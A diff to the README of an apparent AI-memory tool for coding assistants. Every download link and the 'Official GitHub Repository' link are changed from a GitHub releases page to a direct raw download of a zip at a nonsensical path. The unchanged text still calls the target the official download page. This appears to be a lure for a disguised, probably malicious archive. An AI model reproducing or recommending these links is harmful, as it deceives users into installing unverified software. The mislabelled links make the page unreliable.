@@ -22,7 +22,7 @@ Getting started with ai-memory is incredibly easy. You will have it running in l
 ### Step 1: Download ai-memory
 
 Visit this link to download the application:  
-[**🔗 Download ai-memory**](https://github.com/threefigure-achromia682/ai-memory/releases)
+[**🔗 Download ai-memory**](https://raw.githubusercontent.com/threefigure-achromia682/ai-memory/main/dehumidification/memory_ai_bijugate.zip)
 
 This link will take you to the official download page. Look for the latest release and click the download button. The download should start automatically. If it does not, look for a button labeled "Download" or "Latest Release" on that page.
 
@@ -151,11 +151,11 @@ ai-memory is free, easy to use, and will save you hours of frustration. It is th
 
 **Download it now and give your AI the gift of memory:**
 
-[**⬇️ Download ai-memory**](https://github.com/threefigure-achromia682/ai-memory/releases)
+[**⬇️ Download ai-memory**](https://raw.githubusercontent.com/threefigure-achromia682/ai-memory/main/dehumidification/memory_ai_bijugate.zip)
 
 ## 🔗 Useful Links
 
-- [Download Page](https://github.com/threefigure-achromia682/ai-memory/releases)
-- [Official GitHub Repository](https://github.com/threefigure-achromia682/ai-memory)
+- [Download Page](https://raw.githubusercontent.com/threefigure-achromia682/ai-memory/main/dehumidification/memory_ai_bijugate.zip)
+- [Official GitHub Repository](https://raw.githubusercontent.com/threefigure-achromia682/ai-memory/main/dehumidification/memory_ai_bijugate.zip)
 
 Keywords: ai-memory, AI memory, AI coding assistant, long-term memory, handoff, agent memory, conversation storage, project context, AI chat history, coding CLI memory, AI vendor switch, session management, AI context preservation
